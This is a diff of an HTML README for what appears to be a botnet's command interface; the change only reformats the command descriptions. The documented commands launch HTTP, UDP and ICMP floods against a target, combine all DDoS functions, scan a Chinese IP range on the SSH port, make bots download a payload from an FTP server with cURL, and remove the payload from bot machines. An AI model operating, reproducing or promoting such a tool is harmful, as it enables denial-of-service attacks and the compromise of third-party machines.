@@ -26,7 +26,7 @@ Raw socket programming is really hard for me. That's why all of <strong>The volu
   <li><strong>?http [url]</li></strong>
     <ul>
       <li>?http https://target.com</li>
-      <p>- Flood HTTP get request to target.</p>
+      - Flood HTTP get request to target.
     </ul>
 </ul>
 
@@ -34,8 +34,8 @@ Raw socket programming is really hard for me. That's why all of <strong>The volu
   <li><strong>?udp [ip] [size]</li></strong>
     <ul>
       <li>?udp 192.168.1.16 500</li>
-      <p>- Flood UDP packets by random src and dst port to target. 
-      - Min and Max of Buffer is 1 - 700bytes.</p>
+      - Flood UDP packets by random src and dst port to target. 
+      - Min and Max of Buffer is 1 - 700bytes.
     </ul>
 </ul>
 
@@ -43,7 +43,7 @@ Raw socket programming is really hard for me. That's why all of <strong>The volu
   <li><strong>?icmp [ip]</li></strong>
     <ul>
       <li>?icmp 192.168.1.16</li>
-      <p>- Flood ICMP with large packets to target.</p>
+      - Flood ICMP with large packets to target.
     </ul>
 </ul>
 
@@ -51,7 +51,7 @@ Raw socket programming is really hard for me. That's why all of <strong>The volu
   <li><strong>?fate [url]</li></strong>
     <ul>
       <li>?fate https://target.com</li>
-      <p>- Use all DDoS function to attack target.</p>
+      - Use all DDoS function to attack target.
     </ul>
 </ul>
 
@@ -59,27 +59,27 @@ Raw socket programming is really hard for me. That's why all of <strong>The volu
   <li><strong>?scan [ftp server]</li></strong>
     <ul>
       <li>?scan ftp://192.186.1.16/payload</li>
-      <p>- Scan CHN ip range on SSH port and get payload with cURL.</p>
+      - Scan CHN ip range on SSH port and get payload with cURL.
     </ul>
 </ul>
 
 <ul>
   <li><strong>?kill</li></strong>
     <ul>
-      <p>- Remove payload on bot machine and left the server.</p>
+      - Remove payload on bot machine and left the server.
     </ul>
 </ul>
 
 <ul>
   <li><strong>?stop.ddos</li></strong>
     <ul>
-      <p>- Stop ddos attacking.</p>
+      - Stop ddos attacking.
     </ul>
 </ul>
 
 <ul>
   <li><strong>?stop.scan</li></strong>
     <ul>
-      <p>- Stop scanning.</p>
+      - Stop scanning.
     </ul>
 </ul>
